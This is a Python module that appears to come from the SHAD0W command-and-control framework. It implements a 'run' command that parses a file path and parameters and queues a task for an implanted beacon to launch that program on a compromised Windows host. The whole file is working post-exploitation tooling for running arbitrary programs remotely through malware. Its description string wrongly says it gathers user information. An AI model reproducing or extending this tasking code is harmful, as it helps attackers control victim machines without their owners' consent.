# 
# Launch program on the computer
#

import json
import argparse

__description__ = "Get infomation about the current user the beacon is running as"
__author__ = "@_batsec_"

ERROR = False
error_list = ""

def shellexec_callback(shad0w, data):
    shad0w.debug.log(data, log=True, pre=False)

    return ""

# let argparse error and exit nice
def error(message):
    global ERROR, error_list
    ERROR = True
    error_list += f"\033[0;31m{message}\033[0m\n"

def exit(status=0, message=None): 
    if message != None: print(message)
    return

def build_inject_info(args):

    # create the json object to tell the beacon
    # where to execute the code.

    info = {}

    info["file"] = ' '.join(args.file)
    info["params"] = None

    if args.param is not None:
        info["params"] = ' '.join(args.param)
        return info["file"] + "|" + info["params"]

    return info["file"] + "|"
    

def main(shad0w, args):

    # save the raw args
    raw_args = args
    
    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.error("ERROR: No active beacon")
        return

    # usage examples
    usage_examples = """

Examples:

run
run -f C:\\text.exe -p main
run "C:\\Documents and Settings\\test.exe -p main"
"""
    
    parse = argparse.ArgumentParser(prog='run',
                                formatter_class=argparse.RawDescriptionHelpFormatter,
                                epilog=usage_examples)
    
    ERROR = False
    # keep it behaving nice
    parse.exit = exit
    parse.error = error

    # setup the args
    parse.add_argument("-f", "--file", nargs='+', required=True, help="Location of the file to want to run")
    parse.add_argument("-p", "--param", nargs='+', required=False, help="Arguments to run the file with")
    #parse.add_argument("file", nargs='*', help="Location of the file to want to run")

    # make sure we dont die from weird args
    try:
        args = parse.parse_args(args[1:])
    except:
        pass

    # the user might have just run 'run' but if not lets fail
    if ERROR:
        print(error_list)
        parse.print_help()
        return
    
    # do we have arguments to pass to the function?
    data = build_inject_info(args)
    # make the json
    #data = {"op" : OPCODE_LS, "args": dir}
    #data = json.dumps(data)
    # set a task for the current beacon to do
    shad0w.beacons[shad0w.current_beacon]["callback"] = shellexec_callback
    shad0w.beacons[shad0w.current_beacon]["task"] = "STL run "+ data